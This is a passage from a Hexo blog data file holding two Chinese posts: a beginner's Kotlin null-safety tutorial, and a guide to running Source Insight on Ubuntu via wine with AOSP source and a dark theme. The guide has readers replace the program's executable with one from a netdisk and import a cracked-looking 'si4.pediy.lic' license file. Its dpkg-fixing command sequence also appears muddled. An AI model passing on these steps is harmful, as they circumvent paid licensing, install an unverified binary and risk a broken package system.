like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<blockquote>\n<p>NPE（NullPointerException）是最低级且也最容易犯的错，<del>也是最喜欢遇到的Bug因为好解</del>。<br>本文适合Kotlin入门萌新食用，大佬轻喷哈哈哈！</p>\n</blockquote>\n<h3 id=\"问号N连帮你空处理（-）\"><a href=\"#问号N连帮你空处理（-）\" class=\"headerlink\" title=\"问号N连帮你空处理（?）\"></a>问号N连帮你空处理（?）</h3><p>假如服务端返回一个json嵌套了各种数据，映射成POJO大概是这样：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 此处为简洁省去getter和setter</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestParent</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> TestChild child;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestChild</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> List&lt;TestDog&gt; dogs;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestDog</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>然后，你为了知道他爸的儿子的第一条狗叫啥名，你需要这样：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (parent != <span class=\"literal\">null</span>) &#123; <span class=\"comment\">// 有爹</span></span><br><span class=\"line\">    TestParent.<span class=\"type\">TestChild</span> <span class=\"variable\">child</span> <span class=\"operator\">=</span> parent.getChild();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (child != <span class=\"literal\">null</span>) &#123; <span class=\"comment\">// 有儿子</span></span><br><span class=\"line\">        List&lt;TestParent.TestChild.TestDog&gt; dogs = child.getDogs();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (dogs != <span class=\"literal\">null</span> &amp;&amp; !dogs.isEmpty()) &#123;</span><br><span class=\"line\">            TestParent.TestChild.<span class=\"type\">TestDog</span> <span class=\"variable\">dog0</span> <span class=\"operator\">=</span> dogs.get(<span class=\"number\">0</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (dog0 != <span class=\"literal\">null</span>) &#123; <span class=\"comment\">// 有狗</span></span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;name:&quot;</span> + dog0.getName());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>初学者大部分都会这样写，我的天，这太臃肿了，丑代码，凑行数，于是我决定优化一下（这里不考虑Java 8的API），尽可能减少if嵌套：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">TestParent.<span class=\"type\">TestChild</span> <span class=\"variable\">child</span> <span class=\"operator\">=</span> parent != <span class=\"literal\">null</span> ? parent.getChild() : <span class=\"literal\">null</span>;</span><br><span class=\"line\">List&lt;TestParent.TestChild.TestDog&gt; dogs = child != <span class=\"literal\">null</span> ? child.getDogs() : <span class=\"literal\">null</span>;</span><br><span class=\"line\">TestParent.TestChild.<span class=\"type\">TestDog</span> <span class=\"variable\">dog0</span> <span class=\"operator\">=</span> (dogs != <span class=\"literal\">null</span> &amp;&amp; !dogs.isEmpty()) ? dogs.get(<span class=\"number\">0</span>) : <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (dog0 != <span class=\"literal\">null</span>) System.out.println(<span class=\"string\">&quot;name:&quot;</span> + dog0.getName());</span><br></pre></td></tr></table></figure>\n<p>这种拆分，虽然简洁，但损失了可读性，反应慢的同学一时半会儿还搞不清楚这是在干嘛。<br>那么用Kotlin的“?”（空处理操作符）怎么做呢？</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">println(<span class=\"string\">&quot;name:&quot;</span> + parent?.child?.dogs?.firstOrNull()?.name)</span><br></pre></td></tr></table></figure>\n<p>窝草，直接一行就搞定了！当我第一次写出这个代码时，我就被这该死的Kotlin语法糖给甜晕了。<br><strong>稍微解释一下：<br>1、println是Kotlin的内置函数，和Java的sout一样。<br>2、这里用到了Kotlin集合类中的内置函数firstOrNull，顾名思义就知道是去集合的第一个，如果取不到就返回null。<br>3、? 操作符的含义就是判断左值是否为空，如果不为空就会继续后面的 .xxx 调用，这里就是链式调用，一旦链中有一个环节为空，整个表达式就返回空。<br>4、结合上面的Java代码看，其实Kotlin的空处理操作符也就是简化了Java判断的三目运算符，因此我在Java当中也可以骚一行：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">System.out.println(<span class=\"string\">&quot;name:&quot;</span> + (((parent != <span class=\"literal\">null</span> ? parent.getChild() : <span class=\"literal\">null</span>) != <span class=\"literal\">null</span> ? parent.getChild().getDogs() : <span class=\"literal\">null</span>) != <span class=\"literal\">null</span> ? (!parent.getChild().getDogs().isEmpty() ? (parent.getChild().getDogs().get(<span class=\"number\">0</span>) != <span class=\"literal\">null</span> ? parent.getChild().getDogs().get(<span class=\"number\">0</span>).getName() : <span class=\"literal\">null</span>) : <span class=\"literal\">null</span>) : <span class=\"literal\">null</span>));</span><br><span class=\"line\"><span class=\"comment\">// 好了，你疯了吗？我只是想告诉大家有志者事竟成，没有一行代码解决不了的事情哈哈哈哈！</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"你很确信你的对象不为空（-）\"><a href=\"#你很确信你的对象不为空（-）\" class=\"headerlink\" title=\"你很确信你的对象不为空（!!）\"></a>你很确信你的对象不为空（!!）</h3><p>与空处理相反，!!操作符的含义是非空断言，我们来举个例子看看有无此操作符的区别：<br>需要空检查：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">val</span> files = File(<span class=\"string\">&quot;/sdcard/Android&quot;</span>).listFiles()</span><br><span class=\"line\"><span class=\"keyword\">if</span> (files != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(f <span class=\"keyword\">in</span> files) &#123;</span><br><span class=\"line\">\t\tprintln(f.name)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>不需要空检查（即人为断言files不为空）：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">val</span> files = File(<span class=\"string\">&quot;/sdcard/Android&quot;</span>).listFiles()!!</span><br><span class=\"line\"><span class=\"keyword\">for</span>(f <span class=\"keyword\">in</span> files) &#123;</span><br><span class=\"line\">\tprintln(f.name)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"谁不空就用谁（-）\"><a href=\"#谁不空就用谁（-）\" class=\"headerlink\" title=\"谁不空就用谁（?:）\"></a>谁不空就用谁（?:）</h3><p>先看一个常用代码块：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">showSoftInput</span><span class=\"params\">(Context context)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (context <span class=\"keyword\">instanceof</span> Activity) &#123;</span><br><span class=\"line\">        <span class=\"type\">View</span> <span class=\"variable\">view</span> <span class=\"operator\">=</span> ((Activity) context).getCurrentFocus();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (view == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            view = <span class=\"keyword\">new</span> <span class=\"title class_\">View</span>(context);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"type\">InputMethodManager</span> <span class=\"variable\">imm</span> <span class=\"operator\">=</span> (InputMethodManager) context</span><br><span class=\"line\">                .getSystemService(Context.INPUT_METHOD_SERVICE);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"literal\">null</span> != imm) &#123;</span><br><span class=\"line\">            view.requestFocus();</span><br><span class=\"line\">            imm.showSoftInput(view, InputMethodManager.SHOW_FORCED);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里的view先尝试通过getCurrentFocus获取，如果获取不到再new。类似这样的操作太常见了，甚至还有嵌套几层的。用Elvis操作符（?:）怎么实现呢？</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">showSoftInput</span><span class=\"params\">(context: <span class=\"type\">Context</span>)</span></span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (context <span class=\"keyword\">is</span> Activity) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">val</span> view = (context.currentFocus ?: View(context)).apply &#123; requestFocus() &#125;</span><br><span class=\"line\">        (context.getSystemService(Context.INPUT_METHOD_SERVICE) <span class=\"keyword\">as</span> InputMethodManager).apply &#123;</span><br><span class=\"line\">            showSoftInput(view, InputMethodManager.SHOW_FORCED)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"layout":"post","title":"Ubuntu安装Source Insight导入Android源码并设置仿IDEA主题Darcula","subtitle":"同样适用于Deepin哦！","date":"2019-08-15T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n### 预览\n先来张图给大家感受下效果，然后我再慢慢道来过程，保证你避免每一步的坑。\n![preview](https://imgconvert.csdnimg.cn/20190816214656427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n### 我们要做什么\n1、由于Source Insight（以下简称SI）是Windows应用，所以不能直接安装在Linux上，于是我们要借助wine，所以第一步会介绍wine的安装过程和坑；\n2、介绍SI在Linux（以Ubuntu 16.04为例）上的安装，并介绍如何导入免费证书（个人建议大家有条件还是付费支持一下SI这个软件，真的是个好东西，比IDEA看源码实在快太多了，我已经买了最新版4.0，还是挺良心的，一次性付费，239美刀）；\n3、用SI导入AOSP源码并Sync文件建立索引，开头那张截图就是正在Sync，建立完成后就可以快速导航各个方法类引用等等了；\n4、默认主题太刺眼，怎么办？还是习惯IDEA的风格，没事，我配置都写好了，只用你一键导入并改改字体大小即可！\n### 第一步：安装wine\n直接命令走起：\n```shell\nsudo apt-get install wine\n```\n过程中终端会显示一个确定页面，按Tab键选中并确定即可，然后再选“是”。\n一般来说由于依赖问题，上述命令都是不能一次性安装成功的，这时候直接：\n```shell\nsudo apt-get install -f\n```\n好，我已经看穿了一切，这一步估计大多数用户依然是要出错的，且错误提示：\n\n> dpkg: 处理归档\n> /var/cache/apt/archives/xxx.deb\n> (--unpack)时出错：  尝试覆盖共享的……\n\n巴拉巴拉这类鬼东西，如果你也是，那么很好，下面一套连招即可解决：\n```shell\nsudo mv /var/lib/dpkg/info /var/lib/dpkg/info_back\nsudo mkdir /var/lib/dpkg/info\nsudo apt-get update\nsudo apt-get install -f\nsudo mv /var/lib/dpkg/info /var/lib/dpkg/info_back\nsudo mv /var/lib/dpkg/info_back /var/lib/dpkg/info\n```\n安装成功后执行一下wine命令，没提示错误即可。\n### 第二步：安装SI\n先去官网下载最新版的exe：[https://www.sourceinsight.com/download/](https://www.sourceinsight.com/download/)\n我这里版本号是4.0.0098，建议和我一样，如果下载困难的，可直接在我文末的网盘中下载本文所有资源。\n用wine命令安装SI：\n```shell\nwine sourceinsight4098-setup.exe\n```\n这个时候会弹出Windows程序的安装过程，全部下一步即可，没有特殊配置，安装路径也最好不要改。\n安装完成后你在Ubuntu的应用程序里已经可以搜到SI了，桌面上也会自动创建快捷方式：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20190816221426934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n然后不要急着打开，把网盘里下载下来的另一个exe文件复制到SI安装目录中：\n```shell\ncd ~/.wine/drive_c/Program\\ Files\\ \\(x86\\)/Source\\ Insight\\ 4.0/\ncp ~/你下载并解压后的目录文件夹/sourceinsight4.exe sourceinsight4.exe\n```\ncopy覆盖后，再打开SI，此时会弹出授权弹窗，选第三个导入证书，这时候选网盘里下载下来的si4.pediy.lic文件即可。\n### 第三步：导入Android源码\n成功打开进入SI之后，首次使用会提示import symbol之类的，可以不用管，直接关掉。\n然后会继续提示是否创建一个新Project，这个时候就选是了，随便取个名字，然后点 **Browser**，选择自己的源码所在的目录即可，再 **Add All** 并勾选 **子目录** 就可以导入了。\n这一步比较简单我就不赘述了，具体图文步骤可参考：[https://www.jianshu.com/p/b7b19bcc0425](https://www.jianshu.com/p/b7b19bcc0425)\n**讲几点注意事项：**\n1、导入成功后打开了SI主界面，但怎么啥都看不见？不要慌，这时候点一下菜单栏里的 **File > Open** 就好了。\n2、如果发现菜单栏里的按钮都点不动怎么办？这个可能是wine的Bug，不要慌，多点几下SI主界面中间的空白处或者最小化再最大化一下，再去点 File 菜单，看是不是可以获取焦点了？\n3、到此我们总算可以查看源码了，但按住Ctrl点击各种方法和变量等等，怎么提示 **Symbol Not Found** 呢？这是没建立索引的原因，选择菜单栏里的 **Project > Synchronize Files** 即可， **这个过程非常久，可能要数小时** （如果你导入了全部AOSP源码的话），总之一定要耐心等待，中途可能会导致SI整个界面停止响应，不要动，过一会儿就好了，Sync这一次以后就再也不用了（除非你文件有较大变动）。\n如果Sync实在太慢，最开始就不要Add太多文件，选择几个需要的，再Add Tree即可。\n### 第四步：SI主题改为IDEA的Darcula暗黑风格\n1、默认字体太小了，我们先改改字体大小：\n按 **Alt + Y** 快捷键（或者菜单栏 **Options > File Type Options**），然后改你喜欢的字体和大小即可：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20190816223801624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n改后确定会弹出一个窗口让你输入 **yes** ，是否应用于所有文件类型，我一般都是yes。\n2、如何设置和IDEA一样的暗黑风格，如果不想自己一点一点手工DIY的同学，可以直接按我的来做：\n先把整体主题设为自带的Black：\n点击 **Options > Visual Theme > Black**，\n然后点击菜单栏 **Options > Style Properties** ，在弹出的窗口中选择右边的 **Load** 按钮，选择网盘中下载的 **darcula-as.xml** 文件即可，Done。\n### 附件\n链接: [https://pan.baidu.com/s/1wVI61SDojBvxffNHct6NHQ](https://pan.baidu.com/s/1wVI61SDojBvxffNHct6NHQ) 提取码: **ij4s** 复制这段内容后打开百度网盘手机App，操作更方便哦！\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20190816230010151.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n","source":"_posts/2019-08-16-Ubuntu安装Source Insight导入Android源码并设置仿IDEA主题Darcula.md","raw":"---\nlayout:     post\ntitle:      Ubuntu安装Source Insight导入Android源码并设置仿IDEA主题Darcula\nsubtitle:   同样适用于Deepin哦！\ndate:       2019-08-16\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - 鼓捣折腾\n    - Android\n    - AOSP\n    - Linux\n---\n\n### 预览\n先来张图给大家感受下效果，然后我再慢慢道来过程，保证你避免每一步的坑。\n![preview](https://imgconvert.csdnimg.cn/20190816214656427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n### 我们要做什么\n1、由于Source Insight（以下简称SI）是Windows应用，所以不能直接安装在Linux上，于是我们要借助wine，所以第一步会介绍wine的安装过程和坑；\n2、介绍SI在Linux（以Ubuntu 16.04为例）上的安装，并介绍如何导入免费证书（个人建议大家有条件还是付费支持一下SI这个软件，真的是个好东西，比IDEA看源码实在快太多了，我已经买了最新版4.0，还是挺良心的，一次性付费，239美刀）；\n3、用SI导入AOSP源码并Sync文件建立索引，开头那张截图就是正在Sync，建立完成后就可以快速导航各个方法类引用等等了；\n4、默认主题太刺眼，怎么办？还是习惯IDEA的风格，没事，我配置都写好了，只用你一键导入并改改字体大小即可！\n### 第一步：安装wine\n直接命令走起：\n```shell\nsudo apt-get install wine\n```\n过程中终端会显示一个确定页面，按Tab键选中并确定即可，然后再选“是”。\n一般来说由于依赖问题，上述命令都是不能一次性安装成功的，这时候直接：\n```shell\nsudo apt-get install -f\n```\n好，我已经看穿了一切，这一步估计大多数用户依然是要出错的，且错误提示：\n\n> dpkg: 处理归档\n> /var/cache/apt/archives/xxx.deb\n> (--unpack)时出错：  尝试覆盖共享的……\n\n巴拉巴拉这类鬼东西，如果你也是，那么很好，下面一套连招即可解决：\n```shell\nsudo mv /var/lib/dpkg/info /var/lib/dpkg/info_back\nsudo mkdir /var/lib/dpkg/info\nsudo apt-get update\nsudo apt-get install -f\nsudo mv /var/lib/dpkg/info /var/lib/dpkg/info_back\nsudo mv /var/lib/dpkg/info_back /var/lib/dpkg/info\n```\n安装成功后执行一下wine命令，没提示错误即可。\n### 第二步：安装SI\n先去官网下载最新版的exe：[https://www.sourceinsight.com/download/](https://www.sourceinsight.com/download/)\n我这里版本号是4.0.0098，建议和我一样，如果下载困难的，可直接在我文末的网盘中下载本文所有资源。\n用wine命令安装SI：\n```shell\nwine sourceinsight4098-setup.exe\n```\n这个时候会弹出Windows程序的安装过程，全部下一步即可，没有特殊配置，安装路径也最好不要改。\n安装完成后你在Ubuntu的应用程序里已经可以搜到SI了，桌面上也会自动创建快捷方式：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20190816221426934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n然后不要急着打开，把网盘里下载下来的另一个exe文件复制到SI安装目录中：\n```shell\ncd ~/.wine/drive_c/Program\\ Files\\ \\(x86\\)/Source\\ Insight\\ 4.0/\ncp ~/你下载并解压后的目录文件夹/sourceinsight4.exe sourceinsight4.exe\n```\ncopy覆盖后，再打开SI，此时会弹出授权弹窗，选第三个导入证书，这时候选网盘里下载下来的si4.pediy.lic文件即可。\n### 第三步：导入Android源码\n成功打开进入SI之后，首次使用会提示import symbol之类的，可以不用管，直接关掉。\n然后会继续提示是否创建一个新Project，这个时候就选是了，随便取个名字，然后点 **Browser**，选择自己的源码所在的目录即可，再 **Add All** 并勾选 **子目录** 就可以导入了。\n这一步比较简单我就不赘述了，具体图文步骤可参考：[https://www.jianshu.com/p/b7b19bcc0425](https://www.jianshu.com/p/b7b19bcc0425)\n**讲几点注意事项：**\n1、导入成功后打开了SI主界面，但怎么啥都看不见？不要慌，这时候点一下菜单栏里的 **File > Open** 就好了。\n2、如果发现菜单栏里的按钮都点不动怎么办？这个可能是wine的Bug，不要慌，多点几下SI主界面中间的空白处或者最小化再最大化一下，再去点 File 菜单，看是不是可以获取焦点了？\n3、到此我们总算可以查看源码了，但按住Ctrl点击各种方法和变量等等，怎么提示 **Symbol Not Found** 呢？这是没建立索引的原因，选择菜单栏里的 **Project > Synchronize Files** 即可， **这个过程非常久，可能要数小时** （如果你导入了全部AOSP源码的话），总之一定要耐心等待，中途可能会导致SI整个界面停止响应，不要动，过一会儿就好了，Sync这一次以后就再也不用了（除非你文件有较大变动）。\n如果Sync实在太慢，最开始就不要Add太多文件，选择几个需要的，再Add Tree即可。\n### 第四步：SI主题改为IDEA的Darcula暗黑风格\n1、默认字体太小了，我们先改改字体大小：\n按 **Alt + Y** 快捷键（或者菜单栏 **Options > File Type Options**），然后改你喜欢的字体和大小即可：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20190816223801624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n改后确定会弹出一个窗口让你输入 **yes** ，是否应用于所有文件类型，我一般都是yes。\n2、如何设置和IDEA一样的暗黑风格，如果不想自己一点一点手工DIY的同学，可以直接按我的来做：\n先把整体主题设为自带的Black：\n点击 **Options > Visual Theme > Black**，\n然后点击菜单栏 **Options > Style Properties** ，在弹出的窗口中选择右边的 **Load** 按钮，选择网盘中下载的 **darcula-as.xml** 文件即可，Done。\n### 附件\n链接: [https://pan.baidu.com/s/1wVI61SDojBvxffNHct6NHQ](https://pan.baidu.com/s/1wVI61SDojBvxffNHct6NHQ) 提取码: **ij4s** 复制这段内容后打开百度网盘手机App，操作更方便哦！\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20190816230010151.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n","slug":"Ubuntu安装Source Insight导入Android源码并设置仿IDEA主题Darcula","published":1,"updated":"2024-03-25T07:31:25.855Z","comments":1,"photos":[],"link":"","_id":"cluaufh0o0016the66lwx5pwg","content":"<h3 id=\"预览\"><a href=\"#预览\" class=\"headerlink\" title=\"预览\"></a>预览</h3><p>先来张图给大家感受下效果，然后我再慢慢道来过程，保证你避免每一步的坑。<br><img src=\"https://imgconvert.csdnimg.cn/20190816214656427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"preview\"></p>\n<h3 id=\"我们要做什么\"><a href=\"#我们要做什么\" class=\"headerlink\" title=\"我们要做什么\"></a>我们要做什么</h3><p>1、由于Source Insight（以下简称SI）是Windows应用，所以不能直接安装在Linux上，于是我们要借助wine，所以第一步会介绍wine的安装过程和坑；<br>2、介绍SI在Linux（以Ubuntu 16.04为例）上的安装，并介绍如何导入免费证书（个人建议大家有条件还是付费支持一下SI这个软件，真的是个好东西，比IDEA看源码实在快太多了，我已经买了最新版4.0，还是挺良心的，一次性付费，239美刀）；<br>3、用SI导入AOSP源码并Sync文件建立索引，开头那张截图就是正在Sync，建立完成后就可以快速导航各个方法类引用等等了；<br>4、默认主题太刺眼，怎么办？还是习惯IDEA的风格，没事，我配置都写好了，只用你一键导入并改改字体大小即可！</p>\n<h3 id=\"第一步：安装wine\"><a href=\"#第一步：安装wine\" class=\"headerlink\" title=\"第一步：安装wine\"></a>第一步：安装wine</h3><p>直接命令走起：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install wine</span><br></pre></td></tr></table></figure>\n<p>过程中终端会显示一个确定页面，按Tab键选中并确定即可，然后再选“是”。<br>一般来说由于依赖问题，上述命令都是不能一次性安装成功的，这时候直接：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install -f</span><br></pre></td></tr></table></figure>\n<p>好，我已经看穿了一切，这一步估计大多数用户依然是要出错的，且错误提示：</p>\n<blockquote>\n<p>dpkg: 处理归档<br>&#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives&#x2F;xxx.deb<br>(–unpack)时出错：  尝试覆盖共享的……</p>\n</blockquote>\n<p>巴拉巴拉这类鬼东西，如果你也是，那么很好，下面一套连招即可解决：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo mv /var/lib/dpkg/info /var/lib/dpkg/info_back</span><br><span class=\"line\">sudo mkdir /var/lib/dpkg/info</span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install -f</span><br><span class=\"line\">sudo mv /var/lib/dpkg/info /var/lib/dpkg/info_back</span><br><span class=\"line\">sudo mv /var/lib/dpkg/info_back /var/lib/dpkg/info</span><br></pre></td></tr></table></figure>\n<p>安装成功后执行一下wine命令，没提示错误即可。</p>\n<h3 id=\"第二步：安装SI\"><a href=\"#第二步：安装SI\" class=\"headerlink\" title=\"第二步：安装SI\"></a>第二步：安装SI</h3><p>先去官网下载最新版的exe：<a href=\"https://www.sourceinsight.com/download/\">https://www.sourceinsight.com/download/</a><br>我这里版本号是4.0.0098，建议和我一样，如果下载困难的，可直接在我文末的网盘中下载本文所有资源。<br>用wine命令安装SI：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wine sourceinsight4098-setup.exe</span><br></pre></td></tr></table></figure>\n<p>这个时候会弹出Windows程序的安装过程，全部下一步即可，没有特殊配置，安装路径也最好不要改。<br>安装完成后你在Ubuntu的应用程序里已经可以搜到SI了，桌面上也会自动创建快捷方式：<br><img src=\"https://imgconvert.csdnimg.cn/20190816221426934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>然后不要急着打开，把网盘里下载下来的另一个exe文件复制到SI安装目录中：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd ~/.wine/drive_c/Program\\ Files\\ \\(x86\\)/Source\\ Insight\\ 4.0/</span><br><span class=\"line\">cp ~/你下载并解压后的目录文件夹/sourceinsight4.exe sourceinsight4.exe</span><br></pre></td></tr></table></figure>\n<p>copy覆盖后，再打开SI，此时会弹出授权弹窗，选第三个导入证书，这时候选网盘里下载下来的si4.pediy.lic文件即可。</p>\n<h3 id=\"第三步：导入Android源码\"><a href=\"#第三步：导入Android源码\" class=\"headerlink\" title=\"第三步：导入Android源码\"></a>第三步：导入Android源码</h3><p>成功打开进入SI之后，首次使用会提示import symbol之类的，可以不用管，直接关掉。<br>然后会继续提示是否创建一个新Project，这个时候就选是了，随便取个名字，然后点 <strong>Browser</strong>，选择自己的源码所在的目录即可，再 <strong>Add All</strong> 并勾选 <strong>子目录</strong> 就可以导入了。<br>这一步比较简单我就不赘述了，具体图文步骤可参考：<a 